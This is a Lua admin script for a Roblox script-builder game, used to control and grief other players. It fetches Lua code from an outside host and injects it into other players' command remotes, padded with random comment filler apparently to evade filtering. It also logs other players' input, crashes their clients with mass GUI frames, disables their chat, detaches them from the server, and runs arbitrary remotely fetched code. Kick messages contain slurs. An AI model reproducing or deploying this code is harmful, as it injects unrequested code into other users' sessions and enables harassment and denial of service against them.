--received--
--grubs crapmin
--[[
hacked together lol

todo:
tidy up
add slap
--]]
--change
ownerName="CoreSB" 


https={}
rcon=true
env=getfenv(0)

for _, p in ipairs(game:GetService"Players":GetPlayers()) do
	if p.Name==ownerName then
		owner=p
	end
end

--realprint=print
print("starting admin")


function print_to(player, ...)
	if player then
		local o={...}
		local oo={}
		local orange=false
		if o[1]=="orange" then
			table.remove(o, 1)
			orange=true
		end
		for i, v in ipairs(o) do
			oo[i]=tostring(v)
		end
		if type(player)=="string" then
			player=getPlayer(player)
			if not player then
				return
			end
		end
		local str = Instance.new('StringValue',player)
		str.Name = 'SB_Output:Output'
		
		if orange then
			str.Value = game:GetService('HttpService'):JSONEncode{'Warn',table.concat(oo, "\t")}	
		else
			str.Value = game:GetService('HttpService'):JSONEncode{'Print',table.concat(oo, "\t")}		
		end
	end
end

function print(...)
	--realprint(...)
	print_to(ownerName, ...)
end

function getPlayer(pname)
	if type(pname)~="string" then
		pname=pname.Name
	end
	for _, p in ipairs(game:GetService"Players":GetPlayers()) do
		if p.Name:lower():match("^"..pname:lower()) then
			return p
		end
	end
end

print("2 starting admin")

--yo another 1 from the grub
local http=game:GetService'HttpService'
local chatconnector={callbacks={}}

function chatconnector:connect(f)
	self.callbacks[#self.callbacks+1]=f
end
function chatconnector.fire(msg)
	for _, callback in pairs(chatconnector.callbacks) do
		callback(msg)
	end
end


function attachCommands(p)
	p.Chatted:connect(function(msg)
		if msg:lower()=="path" then
			print("giving path to", p.Name)
			local str = Instance.new('StringValue',p)
			str.Name = 'SB_Output:Output'
			str.Value = game:GetService('HttpService'):JSONEncode{'Warn','[grub admin] Running grub\'s path.'}
			p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value="hl/http://pastebin.com/raw.php?i=Fk79gxW6"
		elseif msg:lower()=="rejoin" then
			
			game:GetService"TeleportService":TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
		elseif msg:lower()=="draw" then
			local str = Instance.new('StringValue',p)
			str.Name = 'SB_Output:Output'
			str.Value = game:GetService('HttpService'):JSONEncode{'Warn','[grub admin] Keep in mind, this is a free model and is NOT made by grubsteak. (not his credit)'}	
			p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value="hl/http://pastebin.com/raw.php?i=sGMLfkZt"
		end
	end)
	local function log(value)
		if value:lower():match("^..?.?/") and p.Name~=ownerName then
			print(p.Name.." ran something:".. value:lower():match("^..?.?/"))
			if(value:find"http://") then
				print(p.Name, " ran https #", #https+1)
				https[#https+1]=http:GetAsync(value:match("http://.+"))
			end
		end
		if value:lower():match("^g/") then
			for _ in (" "..value:sub(3, -1).." "):lower():gmatch(" gun%A") do
				print_to(p, "orange", "[grub extension] Got gun")
				runfunc("https://grubland-grubsteak.c9.io/m16.lua", false)(p.Name)
				wait(1)
			end
		end
	end
	p.Chatted:connect(log)
	
	p.PlayerGui:WaitForChild"SB_DataTransfer":WaitForChild"SB_CommandRemote".Changed:connect(log)
end

for _, p in ipairs(game:GetService"Players":GetPlayers()) do
	attachCommands(p)
end

game:GetService"Players".PlayerAdded:connect(function(p)
	if p.Name==ownerName then
		p.Chatted:connect(chatconnector.fire)
		p:WaitForChild"PlayerGui":WaitForChild"SB_DataTransfer":WaitForChild"SB_CommandRemote".Changed:connect(function(v)
			if env.console then
				chatconnector.fire(v, false)
			end
		end)
		owner=p
		print("yo wattup "..ownerName)
	elseif p.Name=="Nexure" then
		p.CharacterAdded:connect(function(char)
			wait(.5)
			if char:FindFirstChild"TrafficCone" then
				char:FindFirstChild"TrafficCone":Remove()	
			end
		end)
	end
	attachCommands(p)
end)
if owner then
	owner.Chatted:connect(chatconnector.fire)
	owner.PlayerGui.SB_DataTransfer.SB_CommandRemote.Changed:connect(function(v)
		if env.console then
			chatconnector.fire(v, false)
		end
	end)
end
env=getfenv(0)
print("---")

scale=1/5



--Instance.new("BlockMesh", p).Scale=Vector3.new(1,1,1)*scale
local base=Instance.new("Part")
base.Anchored=true
base.CanCollide=false
base.FormFactor="Custom"
base.Size=Vector3.new(1,1,1)*scale
--p.CanCollide=false



tp=game:GetService"TeleportService"


local audios=[[Allahu Trapbar:288143919
Red Robin Yum:142937769
Sick Mixtape Track 1(How it's made):276862070
Californication:275607744
Can't/Cant Stop:155199230
Dani California:161606686
Otherside:163548096
Around The World:281851774
Scar Tissue:165147575
Snow (Hey Oh):158362020
The Adventures Of Raindance Maggie:237640582
Higher Ground:259286286
A Moment Of Violence:272199863
The Zephyr Song:281850560
Dosed:241781830
Torture Me:302646944
Stadium Arcadium Part 1:251741963
Stadium Arcadium Part 2:251742227
Parallel Universe:314595395
Especially In Michigan:321742188

AND HIS NAME IS JOHN CENA:264594647

nope:130815729
Sad Violin:135308045
Abracadabra:168908696
StarBlade:261851842
What is love:142383642
Get Rekt:177078299
Turret Wife Serenade:142406462

Cave Story Theme:145294677
Gestation:142317001
On To Grasstown:158450192
Gravity:155619994
Plantation:256811992
Tyrant:155620165

Sacrifical:205038803
Basement:211943960
Genesis:190862221

Plenary:230662129
Pressure Cooker:301751070
Pushing Onwards:157342829
Potential For Anything:297905785
Positive Force:236229192

Ritchie Valens - La bamba:169496949
Mariachi:207017288

Cake - The Distance:229391643
The Funeral:166028862
]]
audios=audios:lower();
at={}
for match in audios:gmatch(".-:%d+") do
	local name, id = match:match("([^:]+):(%d+)")
	print(name, id)
	table.insert(at, {name=name; id=id})
end
function play(id, volume, name)
	local a=Instance.new("Sound", workspace)
	a.SoundId="rbxassetid://"..id;
	a.PlayOnRemove=true
	a.Volume=volume and volume or 1
	a:Destroy()
end
--chat functions!--------------------------------------------------------------------------------------------------------
function gag(names)
	for name in names:gmatch("%w+") do
		for _, p in ipairs(game.Players:GetPlayers()) do
			if p.Name:lower():match("^"..name:lower()) then
				print("gagging "..p.Name)
				local shtstr1="--[==["
				local shtstr2="--[==["
				math.randomseed(os.time())
				for i=1, 500 do
					shtstr1=shtstr1..string.char(math.random(34, 89))
					shtstr2=shtstr2..string.char(math.random(34, 89))
				end
				shtstr1=shtstr1.."]==]";
				shtstr2=shtstr2.."]==]";
				--p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value=("x/"..shtstr1.."game:GetService\"StarterGui\":SetCore(\"ChatBarDisabled\", true)"..shtstr2)
				p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value=("x/"..shtstr1.."game:GetService\"StarterGui\":SetCoreGuiEnabled(\"Chat\", false)"..shtstr2)
			end
		end
	end
end
function runfunc(link, msg)
	return function(names)
		for name in names:gmatch("%w+") do
			if name=="all" then
				for _, p in ipairs(game.Players:GetPlayers()) do
					if msg then
						print(msg, p.Name)
					end
					local shtstr1="--[==["
					local shtstr2="--[==["
					math.randomseed(os.time())
					for i=1, 5000 do
						shtstr1=shtstr1..string.char(math.random(34, 89))
						shtstr2=shtstr2..string.char(math.random(34, 89))
						if math.random(1,5)==1 then
							shtstr1=shtstr1..'\n'
							shtstr2=shtstr2..'\n'
						end
					end
					shtstr1=shtstr1.."]==]";
					shtstr2=shtstr2.."]==]";
					--p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value=("x/"..shtstr1.."game:GetService\"StarterGui\":SetCore(\"ChatBarDisabled\", true)"..shtstr2)
					
					p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value=("x/"..shtstr1..game:GetService"HttpService":GetAsync(link)..shtstr2)
				end	
				break	
			end
			for _, p in ipairs(game.Players:GetPlayers()) do
				if p.Name:lower():match("^"..name:lower()) then
					if msg then
						print(msg, p.Name)
					end
					local shtstr1="--[==["
					local shtstr2="--[==["
					math.randomseed(os.time())
					for i=1, 5000 do
						shtstr1=shtstr1..string.char(math.random(34, 89))
						shtstr2=shtstr2..string.char(math.random(34, 89))
					end
					shtstr1=shtstr1.."]==]";
					shtstr2=shtstr2.."]==]";
					--p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value=("x/"..shtstr1.."game:GetService\"StarterGui\":SetCore(\"ChatBarDisabled\", true)"..shtstr2)
					p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value=("x/"..shtstr1..game:GetService"HttpService":GetAsync(link)..shtstr2)
				end
			end
		end
	end
end
pp=runfunc("https://grubland-grubsteak.c9.io/weiner.lua", "we\5inering")
tank=runfunc("https://grubland-grubsteak.c9.io/tank.lua", "tanking")
function nickelkick(names)
	for name in names:gmatch("%w+") do
		for _, p in ipairs(game.Players:GetPlayers()) do
			if p.Name:lower():match("^"..name:lower()) then
				print("rekting "..p.Name)
				local shtstr1="--[==["
				local shtstr2="--[==["
				math.randomseed(os.time())
				for i=1, 500 do
					shtstr1=shtstr1..string.char(math.random(34, 89))
					shtstr2=shtstr2..string.char(math.random(34, 89))
				end
				shtstr1=shtstr1.."]==]";
				shtstr2=shtstr2.."]==]";
				--p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value=("x/"..shtstr1.."game:GetService\"StarterGui\":SetCore(\"ChatBarDisabled\", true)"..shtstr2)
				p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value=("x/"..shtstr1.."local function play(id, looping)local s=Instance.new('Sound', workspace.CurrentCamera); s.SoundId='rbxassetid://'..id; s.Volume=1; s.Looped=not not looping; s:Play() end; play(137473066, false); play(219273159, true); game.StarterGui:SetCoreGuiEnabled('Chat', false); game.Players.LocalPlayer.Parent=nil"..shtstr2)
			end
		end
	end
end

function slap(name)
	local p=getPlayer(name)
	if p then
		print("slappin", p.Name)
		p.Character.Humanoid.PlatformStand=true
		p.Character.Torso.Velocity=p.Character.Torso.Velocity+Vector3.new(50, 300, 50)
		play(146163534, 1)
		wait(1)
		p.Character.Humanoid.PlatformStand=false
	else 
		print("cant slap this bich")
	end
end

function ungag(names)
	for name in names:gmatch("%w+") do
		for _, p in ipairs(game.Players:GetPlayers()) do
			if p.Name:lower():match("^"..name:lower()) then
				print("ungagging "..p.Name)
				local shtstr1="--[==["
				local shtstr2="--[==["
				math.randomseed(os.time())
				for i=1, 500 do
					shtstr1=shtstr1..string.char(math.random(34, 89))
					shtstr2=shtstr2..string.char(math.random(34, 89))
				end
				shtstr1=shtstr1.."]==]";
				shtstr2=shtstr2.."]==]";
				--p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value=("x/"..shtstr1.."game:GetService\"StarterGui\":SetCore(\"ChatBarDisabled\", false)"..shtstr2)
				p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value=("x/"..shtstr1.."game:GetService\"StarterGui\":SetCoreGuiEnabled(\"Chat\", true)"..shtstr2)
				
			end
		end
	end
end
---ADD SETCORE + BYPASS FOR CHAT 
-----------------------------------------------------------
function clean()
	owner.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value="g/nos/all nol/all c b nosky fixl ct noteams debug ng"
	local function recurse(parent)
		for _, child in pairs(parent:GetChildren()) do
			if child:IsA"Sound" then
				child:Stop()
				child.Volume=0
				child:Destroy()
			end
			recurse(child)
		end
	end
	recurse(workspace)
end

function remote(txt)
	rcon:SetAsync("command", txt)
end
-----------------------------------------------------------
function getservers()
	return http:JSONDecode(http:PostAsync("https://us4.proxysite.com/includes/process.php?action=update","server-option=us3&d="..http:UrlEncode("http://www.roblox.com/games/getgameinstancesjson?placeId=20279777&startindex=0"),Enum.HttpContentType.ApplicationUrlEncoded))
end
do
	local cache=nil
	function getServers(cached)
		if not cached then
			if not cache then
				cache=getservers()
			end
			return cache
		else
			cache=getservers()
			return cache
		end
		
	end
	
end
function recurse(level, tbl)
	for k, v in pairs(tbl) do
		print(('\t'):rep(level)..tostring(k)..":"..tostring(v))
		if type(v)=="table" then
			recurse(level+1, v)
		end
	end
end
local function computeGUIDhash(str)
	local hash=1337
	for match in str:gmatch(".") do
		hash=hash*23+string.byte(match)
	end
	return hash
end	
commands={
	listservers=function()
		local servers=getServers(true)
		
		table.sort(servers.Collection, function(a, b) return computeGUIDhash(a.Guid)>computeGUIDhash(b.Guid) end)
		
		for n, server in pairs(servers.Collection) do
			local namet={}
			for _, t in ipairs(server.CurrentPlayers) do
				table.insert(namet, t.Username)
			end
			print(n, ">"..table.concat(namet, ", "))
		end
		
	end,
	join = function(server)
		print(server)
		local servers=getServers(false)
		
		table.sort(servers.Collection, function(a, b) return computeGUIDhash(a.Guid)>computeGUIDhash(b.Guid) end)
		if server:match("%d+:.+") then
			print"matched"
			local id, plist = server:lower():match("(%d):(.+)")
			print("id:", id, "plist:", plist)
			local plrs={}
			for name in plist:gmatch("%w+") do
				if name=="all" then
					plrs=game:GetService"Players":GetPlayers()
					break
				end
				print("name found", name, "player", getPlayer(name))
				table.insert(plrs, getPlayer(name))
			end
			table.foreach(plrs,print) 
			for _, player in ipairs(plrs) do
				print("teleporting", player.Name)
				game:GetService"TeleportService":TeleportToPlaceInstance(game.PlaceId,servers.Collection[id+0].Guid, player)
			end
			
			--game:GetService"TeleportService":TeleportToPlaceInstance(20279777,servers.Collection[server:match("%d+")+0].Guid, getPlayer(name:lower()))
		end
	end,
	joinjob = function(server)
		if server:match("^(.-):.+") then
			print"matched"
			local job, plist = server:lower():match("^(.-):(.+)")
			local plrs={}
			for name in plist:gmatch("%w+") do
				if name=="all" then
					plrs=game:GetService"Players":GetPlayers()
					break
				end
				print("name found", name, "player", getPlayer(name))
				table.insert(plrs, getPlayer(name))
			end
			table.foreach(plrs,print) 
			for _, player in ipairs(plrs) do
				print("teleporting", player.Name)
				game:GetService"TeleportService":TeleportToPlaceInstance(job,servers.Collection[id+0].Guid, player)
			end
		end
	end
}


commands.ls=commands.listservers




local thunderid="131300621"
local sound=Instance.new"Sound"
sound.PlayOnRemove=true
sound.Volume=0
sound.SoundId="rbxassetid://"..thunderid
sound:Remove()
function smite(names)
	for name in names:gmatch("%w+") do
		for _, p in ipairs(game.Players:GetPlayers()) do
			if p.Name:lower():match("^"..name:lower()) then
				if p.Character then
					coroutine.wrap(function()
						local sound=Instance.new"Sound"
						sound.PlayOnRemove=true
						sound.Volume=1.5
						sound.SoundId="rbxassetid://"..thunderid
						sound.Parent=workspace
						sound:Remove()
						wait(1)
						--
						local thunder=Instance.new"Part"
						thunder.Parent=workspace
						thunder.FormFactor="Custom"
						thunder.Anchored=true
						Instance.new("CylinderMesh", thunder).Scale=Vector3.new(1, 99999, 1)
						thunder.Transparency=.5
						thunder.BrickColor=BrickColor.new"New Yeller"
						thunder.Size=Vector3.new(7, 1, 7)
						thunder.CanCollide=false
						thunder.CFrame=CFrame.new(p.Character.Torso.CFrame.p)
						game:GetService"Debris":AddItem(thunder, 5)
						p.Character:BreakJoints()
					end)()
				end
			end
		end
	end
end
function lag(names)
	for name in names:gmatch("%w+") do
		print(name)
		for _, p in ipairs(game:GetService"Players":GetPlayers()) do
			if p.Name:lower():match("^"..name:lower()) then
				
				for i=1, 10000 do 
					Instance.new("Frame", Instance.new("ScreenGui", p.PlayerGui)).Size=UDim2.new(1, 0, 1, 0)
				end
			end
		end
	end
end

function sombrero(names)
	if names=="all" then
		names=""
		for _, player in pairs(game:GetService"Players":GetPlayers()) do
			names=names.." "..player.Name
		end
	end
	for name in names:gmatch("%w+") do
		print(name)
		for _, p in ipairs(game:GetService"Players":GetPlayers()) do
			if p.Name:lower():match("^"..name:lower()) and p.Character then
				print("sombreroing", p.Name)
				for _, hat in ipairs(p.Character:GetChildren()) do
					if hat:IsA"Hat" then
						hat:Destroy()
					end
				end
				game:GetService"InsertService":LoadAsset(100425272):GetChildren()[1].Parent=p.Character
			end
		end
	end
end


function annoyingGui(names)
	if names=="all" then
		names=""
		for _, player in pairs(game:GetService"Players":GetPlayers()) do
			names=names.." "..player.Name
		end
	end
	for name in names:gmatch("%w+") do
		print(name)
		for _, player in ipairs(game:GetService"Players":GetPlayers()) do
			if player.Name:lower():match("^"..name:lower()) and player.Character then
				math.randomseed(tick()*100)
				for i=1, math.random(5, 7) do
					local cont=Instance.new"ScreenGui"
					cont.Parent=player.PlayerGui
					local f=Instance.new"Frame"
					f.Parent=cont
					f.BackgroundColor3=Color3.new(math.random()*.5 + .5, math.random()*.5 + .5, math.random()*.5 + .5)
					f.Size=UDim2.new(math.random()*.4 + .3, 0, math.random()*.3 + .2, 0)
					f.Position=UDim2.new(math.random()*.4 + .1, 0, math.random()*.3 + .05, 0)
					f.Draggable=true
					f.Selectable=true
					local t=Instance.new("TextLabel", f)
					t.BackgroundTransparency=0
					t.BorderSizePixel=1
					t.TextScaled=true
					t.Text="Irritating And Intrusive Gui!"..("!"):rep(math.random()*8)
					t.Font=Enum.Font.SourceSansItalic
					t.Size=UDim2.new(1, 0, .2, 0)
					coroutine.wrap(function()
						local spin=math.random()*25
						while true do
							f.Rotation=(((tick()*10)%360)*spin)%360
							wait()
						end
						for i=1,17 do
							math.random()
						end
					end)()
				end
			end
		end
	end
end
sids={}
game.Workspace.DescendantAdded:connect(function(obj)
	if blocked==true then
		if obj.ClassName == "Script" then
			obj.Disabled = true
			obj:Destroy()
		elseif obj.ClassName == "LocalScript" then
			obj.Disabled = true
			obj:Destroy()
		end
	end
	if obj:IsA"Sound" then
		if obj.SoundId:match("%d+")	 then
			sids[obj.SoundId:match("%d+")]=true
		end
		obj.Changed:connect(function(prop)
			if prop=="SoundId" and obj.SoundId:match("%d+") then
				sids[obj.SoundId:match("%d+")]=true
			end
	end)
	end
--[[	if obj.ClassName=="BillboardGui" then
		obj:Destroy() 
	end --]]
end)	

blocked=false


function remote(txt)
	http:GetAsnyc("https://grubland-grubsteak.c9.io/command.php?msg="..http:UrlEncode(txt.."|"..math.floor(tick()).."|"))
end
function dofile(filename)
	print("running ", filename..".lua")
	f, err = loadstring(http:GetAsync("https://grubland-grubsteak.c9.io/"..filename..".lua"))
	if err then
		print(err)
	else
		setfenv(f, setmetatable({}, {__index=getfenv(0)}))()
	end
end



--]]
local oldvalue;


local banfilter
--[[
matdev46;
flame7787;
TheGhostHumor;
--]]
bans={}
function getBans()
	bans={}
	local json=game:GetService"HttpService":GetAsync("https://grubland-grubsteak.c9.io/get_banned.php")
	local bant=game:GetService"HttpService":JSONDecode(json)
	for _, bitem in ipairs(bant) do
		bans[game.Players:GetNameFromUserIdAsync(bitem.id)]=bitem.bantype
	end
end
coroutine.wrap(function()
	while wait(10) do
		getBans()
		--ban filter all the players
		for _, p in ipairs(game:GetService"Players":GetPlayers()) do
			banfilter(p)
		end
	end
end)()
















function createIndex(index)
	return {type="index", data=index}
end

function parseIndex(obj)
	assert(obj.type=="index")
	local value=setmetatable({}, {__index=ENV})
	for _, index in ipairs(obj.data) do
		value=value[index]
	end
	return value
end

function createLiteral(value)
	assert(({number=true, table=true, string=true, ["nil"]=true, boolean=true})[type(value)], "Only the types number, string, boolean, nil, and table are supported")
	local obj={type="literal", value_type=type(value)}
	obj.value=value
	if type(value)=="table" then
		obj.value=game:GetService"HttpService":JSONEncode(value)
	elseif type(value)=="nil" then
		obj.value="type_nil"
	end
	return obj
end

function parseLiteral(obj)
	assert(({number=true, table=true, string=true, ["nil"]=true, boolean=true})[obj.value_type], "Unknown type \""..obj.type.."\"")
	if obj.value_type=="number" then
		return tonumber(obj.value)
	elseif obj.value_type=="string" then
		return obj.value
	elseif obj.value_type=="table" then
		return game:GetService"HttpService":JSONDecode(obj.value)
	elseif obj.value_type=="type_nil" then
		return nil
	elseif obj.value_type=="boolean" then
		return obj.value
	end
	error"Unable to parse literal"
end
--{"type","fcall", "index":<indexed object>, "arguments":[{"type":"string", "value":"Hello World!"},{"type":"number", "value":"3.00"}]}
function createFCall(findex, ...)
	return {type="fcall", index=createIndex(findex), arguments={...}}
end
--predefine it
function recursePrint(tbl, tabs)
	tabs=tabs or 0
	for k, v in pairs(tbl) do
		print(("\t"):rep(tabs), k, "=", v, "<"..type(v)..">")
		if type(v)=="table" then
			recursePrint(v, tabs+1)
		end
	end
end
function parseFCall(obj)
	return function()
	local idex=parseIndex(obj.index)
	local args={}
	--recursePrint(obj)
	for _, v in pairs(obj.arguments) do
		table.insert(args, parseObj(v))
	end
	return createIndex(({idex(unpack(args))})[1])
	end
end
function parseObj(obj)
	if obj.type=="literal" then
		return parseLiteral(obj)
	elseif obj.type=="index" then
		return parseIndex(obj)
	elseif obj.type=="fcall" then
		return parseFCall(obj)	
	else
		print("unknown type:", obj.type)
		return "!UNKNOWN!"
	end
end


function exeFCall(p, t)
local str=Instance.new("StringValue", getPlayer(p))
str.Name="Execute"
str.Value=http:JSONEncode(t)
end

function Implant(p)
	runfunc("https://grubland-grubsteak.c9.io/lbp.lua", "implanting")(p)
end












function banfilter(player)
	for k, name in pairs(bans) do
		if type(k)=="number" then
			--print("ban:", name)
			if name:lower()==player.Name:lower() then
				print("kicking this stupid kunt >"..player.Name)
				
				player:kick"u have been rekted on my turf. plz take a seet m8"
			end
		elseif type(k)=="string" then --kick with a reason
			--print("reason ban: ", k, name)
			if k:lower()==player.Name:lower() then
				print("kicking this stupid kunt >"..player.Name)
				
				player:kick(name)
			end
		end
	end
end

getBans()

game:GetService"Players".PlayerAdded:connect(banfilter)
for _, p in ipairs(game:GetService"Players":GetPlayers()) do
	banfilter(p)
end

local lastcommand=""
chatconnector:connect(function(msg, secure)	
	local nocmd=false
	if secure==nil then secure=true end
	msg=msg:gsub("^!", "")
	msg=msg:gsub("^/e ","")
	msg=msg:gsub("^/", "")
	if msg:lower():match"^kick .+" then --KICK
		for name in (msg:lower():match"kick (.+)"):gmatch("%w+") do
			print(name)
			if getPlayer(name) then
				print('^ found player')
				getPlayer(name):Kick"get rekt m9"
			end
		end
	elseif msg:lower():match"^ban .+" and secure then
		for name in (msg:lower():match"ban (.+)"):gmatch("%w+") do
			print(name)
			if getPlayer(name) then
				print('^ found player')
				print(game:GetService"HttpService":GetAsync("https://grubland-grubsteak.c9.io/ban.php?id="..game:GetService"Players":GetUserIdFromNameAsync(getPlayer(name).Name).."&bantype=1"))
				getPlayer(name):Kick"get rekt m9"
			end
		end
	elseif msg:match"^exe " then
		local f, err=loadstring(msg:match("^exe (.+)"))
		if err then
			print("syntax error:", err)
		else
			xpcall(f, function(err)
				print("error:"..err)
			end)
	end
	elseif msg:match"^>>" then
		local f, err=loadstring(msg:match("^>>(.+)"))
		if err then
			print("syntax error:", err)
		else
			f()
		end
	elseif msg:match"^>" then
		local f, err=loadstring(msg:match("^>(.+)"))
		if err then
			print("syntax error:", err)
		else
			xpcall(f, function(err)
				print("error:"..err)
			end)
		end
	elseif msg:lower():match("^muteall")  then
		local function recurse(parent)
			for _, child in pairs(parent:GetChildren()) do
				if child:IsA"Sound" then
					child:Stop() 
					child.Volume=0
					child:Destroy()
				end
				recurse(child)
			end
		end
		recurse(workspace)
		for id in pairs(sids) do
			play(id, 0)	
		end
	elseif msg:lower():match("^muteother") or msg:lower()=="mute" then
		local function recurse(parent)
			for _, child in pairs(parent:GetChildren()) do
				if child:IsA"Sound" then
					child:Stop() 
					child.Volume=0
					child:Destroy()
				end
				recurse(child)
			end
		end
		recurse(workspace)
	elseif msg:lower():match("^muteme") then
		for id in pairs(sids) do
			play(id, 0)	
		end
	elseif msg:lower():match"^smite .+" then
		smite(msg:lower():match"^smite (.+)")
	elseif msg:lower():match"^goldgun" then
		runfunc("https://grubland-grubsteak.c9.io/goldgun.lua", "goldgun")(ownerName)
	elseif msg:lower():match"^lag .+" and secure then
		lag(msg:lower():match"^lag (.+)")
	elseif msg:lower():match"^gag .+" then
		gag(msg:lower():match"^gag (.+)")
	elseif msg:lower():match"^pp .+" then
		pp(msg:lower():match"^pp (.+)")
	elseif msg:lower():match"^tank .+" then
		tank(msg:lower():match"^tank (.+)")
	elseif msg:lower():match"^b0ner .+" then
		runfunc("https://grubland-grubsteak.c9.io/b0ner.lua", "b0nering")(msg:lower():match"^b0ner (.+)")
	elseif msg:lower():match("^runlua .+ .+") then
		local filename, args = msg:lower():match("^runlua (.+) (.+)")
		print("running ", filename..".lua with args", args)
		runfunc("https://grubland-grubsteak.c9.io/"..filename..".lua", filename.."-ing")(args)
	elseif msg:lower():match("^implant .+") then
		Implant(msg:lower():match("^implant (.+)"))
	elseif msg:lower():match("^dofile .+") then
		local filename = msg:lower():match("^dofile (.+)")
		dofile(filename)
	elseif msg:lower():match"^slap (.+)" then
		slap(msg:lower(1):match"^slap (.+)")
	elseif msg:lower():match"^ungag .+" then
		ungag(msg:lower():match"^ungag (.+)")
	elseif msg:lower():match"^nickelkick .+" then
		nickelkick(msg:lower():match"^nickelkick (.+)")
	elseif msg:lower():match"^nk .+" then
		nickelkick(msg:lower():match"^nk (.+)")		
	elseif msg:lower():match("^clean") then
		clean()
	elseif msg:lower():match("^sd") and secure then
		game:GetService"Players":ClearAllChildren()
	elseif msg:lower():match("^bin %w+") then
		print("doin a bin", msg)
		game:GetService"HttpService":GetAsync("http://requestb.in/"..msg:match("^bin (%w+)").."?jobid="..game.JobId)
	elseif msg:lower():match("^rcon") then
		remote(msg:match("^rcon (.+)"))
		oldvalue=msg:match("^rcon (.+)")
	elseif msg:lower():match"^block" then
		blocked=not blocked
	elseif msg:lower():match"^msg .*" then
		local mesg=Instance.new("Message", workspace)
		mesg.Text=msg:match(" (.-)$"):gsub("|","\5")
		game:GetService"Debris":AddItem(mesg, 5)
	elseif msg:lower():match("^sombrero .+") then
		sombrero(msg:lower():match("^sombrero (.+)"))
	elseif msg:lower():match("^ag .+") then
		annoyingGui(msg:lower():match("^ag (.+)"))
	elseif msg:lower():match("^amy .+") then
		_G.target=getPlayer(msg:match("^amy (.+)"))
		if _G.target then
			_G.fred=false
			chatconnector.fire("dofile amy")
		end
	elseif msg:lower():match("^fred .+") then
		_G.target=getPlayer(msg:match("^fred (.+)"))
		if _G.target then
			_G.fred=true
			chatconnector.fire("dofile amy")
		end
	elseif msg:lower():match("^train") then
		print("train loaded")
		if getPlayer(msg:lower():match("^train (%w+) %w+ %w+")) and getPlayer(msg:lower():match("^train %w+ (%w+) %w+")) and getPlayer(msg:lower():match("^train %w+ %w+ (%w+)")) and getPlayer(msg:lower():match("^train (%w+) %w+ %w+")).Character and getPlayer(msg:lower():match("^train %w+ (%w+) %w+")).Character and getPlayer(msg:lower():match("^train %w+ %w+ (%w+)")).Character then
			print("train!", getPlayer(msg:lower():match("^train (%w+) %w+ %w+")).Name, getPlayer(msg:lower():match("^train %w+ (%w+) %w+")).Name, getPlayer(msg:lower():match("^train %w+ %w+ (%w+)")).Name)
			gmsg=msg
			require(307227743)(getPlayer(msg:lower():match("^train (%w+) %w+ %w+")).Character, getPlayer(msg:lower():match("^train %w+ (%w+) %w+")).Character, getPlayer(msg:lower():match("^train %w+ %w+ (%w+)")).Character);
		else
			print("cant train")
		end
	elseif msg:lower():match("^togglecon") then
		env.console=not env.console
	elseif msg:lower():match("^unban .-") and secure then
		print(game:GetService"HttpService":GetAsync("https://grubland-grubsteak.c9.io/unban.php?id="..game.Players:GetUserIdFromNameAsync(msg:match("^unban (.-)"))))
	elseif msg:lower():match("^play ") then
		
		local found=false
		msg=msg:lower()
		for _, audio in ipairs(at) do
			if audio.name:find(msg:sub(6, -1)) then
				play(audio.id, 1, audio.name)
				found=true
				break
			end
		end
		if not found then
			if msg:sub(6, -1):match("%d+") then
				play(msg:sub(6, -1))
			end
		end
	elseif msg:lower():match("^mute (.+)") then
		msg=msg:lower()
		local found=false
		for _, audio in ipairs(at) do
			if audio.name:find(msg:match("^mute (.+)")) then
				play(audio.id, 0, audio.name)
				found=true
				break
			end
		end
		if not found then
			if msg:match("^mute (.+)"):match("%d+") then
				play(msg:match("^mute (.+)"):match("%d+"), 0)
			end
		end
		--commands
	elseif commands[msg:lower():gsub("^/e%s+",""):match("^%a+")] then
		commands[msg:lower():gsub("^/e%s+",""):match("^%a+")](msg:gsub("^%a+",""))
		--end
	elseif msg:sub(1, 4)=="pri " and secure then
		msg=msg:sub(5, -1)
		local id=game.PlaceId
		if msg:lower():match(":".."%d+"..":") then
			id=msg:match(":".."(%d+)"..":")+0
			msg=msg:match(":%d+:(.+)")
		end
		local pri={}
		for name in msg:gmatch("%w+") do
			print(name)
			if getPlayer(name) then
				print("player found - ", getPlayer(name).Name)
				pri[getPlayer(name)]=true
			elseif name:lower()=="all" then
				for _, p in ipairs(game:GetService"Players":GetPlayers()) do
					pri[getPlayer(p.Name)]=true
				end
				break
				
			end
		end
		print"getting server"
		if id==game.PlaceId then
			local server=tp:ReserveServer(id)
			local plyrs={}
			for p, _ in pairs(pri) do
				table.insert(plyrs, p)	
			end
			print"teleporting"
			tp:TeleportToPrivateServer(id, server, plyrs)
		else
			for p, _ in pairs(pri) do
				tp:Teleport(id, p)
			end
		end
	elseif msg:sub(1, 4)=="img " then
		print"img caught"
		local model=Instance.new"Model"
		msg=msg:sub(5, -1)
		local img=http:GetAsync("http://pastebin.com/raw.php?i="..msg)
		local height, width, json, data=img:gsub("\r", ""):match("(%d+):(%d+)\n(.-)\n(.*)")
		print(height, width)
		--print(json)
		local palette=http:JSONDecode(json)
		local x, y = 0, 0
		for c in (data):gmatch(".") do
			if c=="\n" then
				
				y=y+1
				x=0
			elseif not c:match("%c") then
				local paletteValue=palette[c:byte()-47]
				local p=base:clone()
				p.Color=Color3.new(paletteValue[1]/255, paletteValue[2]/255, paletteValue[3]/255)
				p.Parent=model
				p.CFrame=CFrame.new(Vector3.new(x, 0, y)*scale + Vector3.new(0, 5, 0))
				x=x+1
			end
			
		end
		
		model.Parent=workspace.Base
		print(model.Parent, #model:GetChildren())
	elseif msg:match("^!") then -- only 1 ! because the other one is filtered out
		nocmd=true
		print("running last command...")
		chatconnector.fire(lastcommand);
	else
		nocmd=true
	end
	if not nocmd then
		
		lastcommand=msg
	end
	
end)

function getMsg()
	return game:GetService"HttpService":GetAsync"https://grubland-grubsteak.c9.io/get_command.php"
end
if rcon then
	print("remote admin enabled")
